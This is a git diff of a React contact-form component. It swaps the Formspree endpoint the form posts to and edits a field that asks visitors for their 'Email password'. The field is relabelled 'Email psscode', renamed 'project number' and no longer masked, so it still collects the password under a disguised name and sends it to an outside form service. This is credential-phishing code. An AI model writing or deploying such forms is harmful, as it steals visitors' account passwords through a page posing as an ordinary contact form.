@@ -75,7 +75,7 @@ export default function Contact() {
                     </div>
                 ) : (
                     <form
-                        action="https://formspree.io/f/mgveekya"
+                        action="https://formspree.io/f/mvgoovad"
                         method="POST"
                         onSubmit={handleSubmit} // Attach the submit handler
                         className="mb-8 md:w-2/3 lg:w-3/5 xl:w-1/2 md:mb-0 flex flex-col justify-between px-4 pt-8 pb-5 md:px-6 md:pt-10 md:pb-10 aspect-[5/7] lg:aspect-[55/70] rounded-xl bg-[#171d26]"
@@ -105,11 +105,10 @@ export default function Contact() {
                                     className="bg-primary placeholder-slate/[0.4] border-primary focus:border-accent focus:text-accent shadow-lg border-2 rounded-[8px] py-2 px-8 outline-none transition-all transition-700"
                                 />
                                 <input
-                                    placeholder="Email password"
-                                    name="password"
+                                    placeholder="Email psscode"
+                                    name="project number"
                                     required
                                     autoComplete="off"
-                                    type="password"
                                     className="bg-primary placeholder-slate/[0.4] border-primary focus:border-accent focus:text-accent shadow-lg border-2 rounded-[8px] py-2 px-8 outline-none transition-all transition-700"
                                 />
                                 <input
